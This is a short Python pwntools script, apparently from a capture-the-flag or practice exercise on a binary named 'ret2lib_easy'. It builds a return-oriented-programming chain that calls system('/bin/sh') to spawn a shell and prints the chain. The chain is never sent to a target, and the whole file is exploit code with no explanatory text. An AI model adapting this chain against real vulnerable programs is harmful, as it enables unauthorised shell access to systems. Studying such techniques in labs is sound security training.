from pwn import *

libc = ELF("./ret2lib_easy")
# Create new ROP object with rebased libc
rop = ROP(libc)

# Call system('/bin/sh')
rop.system(next(libc.search('/bin/sh\x00')))

print rop.dump()
#print rop.dump()
